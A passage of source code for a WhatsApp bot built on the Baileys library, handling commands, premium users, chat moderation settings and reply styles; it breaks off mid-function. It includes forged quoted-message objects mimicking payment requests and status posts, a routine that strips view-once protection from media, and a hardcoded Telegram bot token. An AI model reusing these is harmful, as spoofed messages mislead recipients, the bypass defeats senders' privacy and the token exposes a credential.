require('./lib/listmenu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./lib/scraper2') 
const { Rapi } = require('./lib/rapi.js');
/*const pkg = require('imgur')
const { ImgurClient } = pkg
const client = new ImgurClient({ clientId: "a0113354926015a" })*/
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./lib/myfunc')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')

const dbPath = path.join(__dirname, 'Media', 'database', 'userPoints.json');

// Función para leer la base de datos
function readDatabase() {
    if (fs.existsSync(dbPath)) {
        const data = fs.readFileSync(dbPath);
        return JSON.parse(data);
    }
    return {};
}

function getUserPoints(sender) {
    const userPointsDB = readDatabase();
    return userPointsDB[sender] || 0;
}

// Función para guardar la base de datos
function saveDatabase(data) {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteNyan = JSON.parse(fs.readFileSync('./Media/database/vn.json'))
const Stickers = JSON.parse(fs.readFileSync('./Media/database/stickers.json'))
const ImageNyan = JSON.parse(fs.readFileSync('./Media/database/image.json'))
const VideoNyan = JSON.parse(fs.readFileSync('./Media/database/video.json'))
const DocNyan = JSON.parse(fs.readFileSync('./Media/database/doc.json'))
const ZipNyan = JSON.parse(fs.readFileSync('./Media/database/zip.json'))
const ApkNyan = JSON.parse(fs.readFileSync('./Media/database/apk.json'))

const verifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var timeNow = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var timeNow = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var timeNow = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var timeNow = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var timeNow = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var timeNow = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = nyanBot2 = async (nyanBot2, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await nyanBot2.decodeJid(nyanBot2.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const prefBody = body.startsWith(pric)
        const isCommand = prefBody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await nyanBot2.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isAntiMedia = m.mtype
        //user status
        const isUser = verifieduser.includes(sender)
        const isSamu = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= isSamu || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(nyanBot2, m, premium)
        
        //theme sticker reply
        const StickWait = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/wait.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickAdmin = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/admin.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickBotAdmin = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/botadmin.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickOwner = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/owner.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickGroup = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/group.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickPrivate = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/private.webp')
        nyanBot2.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        //premium
        async function replyprem(teks) {
    reply(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendnyanBot2Message(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await nyanBot2.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function reply(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                nyanBot2.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               nyanBot2.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            }
        }
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./Media/theme/nyancat.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = nyanBot2.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: nyanBot2.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: nyanBot2.getName(botNumber), alias: botname}, owner: { nick: nyanBot2.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: nyanBot2.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: nyanBot2.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
        
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}
        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//bug loading
async function loading () {
var NyanOnLoad = [
"🟠",
"⚫",
"🟠",
"⚫",
"🟢"
]
let { key } = await nyanBot2.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'}, m)

for (let i = 0; i < NyanOnLoad.length; i++) {
await nyanBot2.sendMessage(from, {text: NyanOnLoad[i], edit: key })
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return reply('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const NyanOnResult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            NyanOnResult.push(result)
        }
    resolve(NyanOnResult)
    })
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            reply(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitxeon = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitxeon
            }
            nyanBot2.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !isSamu && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!isSamu && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!nyanBot2.public) {
            if (isSamu && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	nyanBot2.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            nyanBot2.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            nyanBot2.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            nyanBot2.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            nyanBot2.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            nyanBot2.sendPresenceUpdate(xeonpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return nyanBot2.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return nyanBot2.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return nyanBot2.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (isSamu || isAdmins || !isBotAdmins) return
            nyanBot2.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await nyanBot2.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await nyanBot2.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await nyanBot2.getName(i)}\nFN:${await nyanBot2.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }
    
        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await nyanBot2.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
